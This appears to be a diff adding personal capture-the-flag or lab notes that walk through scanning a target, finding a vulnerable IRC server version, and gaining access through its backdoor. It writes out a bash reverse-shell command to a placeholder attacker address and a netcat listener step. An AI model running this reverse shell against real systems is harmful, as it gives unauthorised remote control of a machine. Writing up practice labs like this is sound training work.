@@ -1,0 +1,18 @@
+Step 1 (Scanning)
+- target was validated using ICMP (ping)
+- target was scanned using nmap
+- target was re-scanned using nmap
+
+Step 2 (Enumeration)
+- target has HTTP and IRC
+- HTTP page only contains info that IRC is being configured
+- searching for RFC IRC for more information we see the requirnments for connecting to an IRC is 'PASS,NICK,USER'
+- connecting to the IRC we see a version number which appears to be vulnerable as shown through searchsploit
+ 
+Step 3 (Gaining access)
+- looking into the metasploit script for the vulnerability we see the only thing it does is send to the target 
+'"AB;" + payload.encoded + "\n"' with AB being the first input given to the program, payload encoded being our bash reverse shell and \n being 'new line' which means end current line/ function.
+- 'echo "AB; bash -c 'bash -i >& /dev/tcp/<ip address of attacker>/<port> 0>&1'" ' will execute reverse shell on target
+- set up nc listener on attacker
+
+Remainder is steganography so i will continue after my exam attempt.
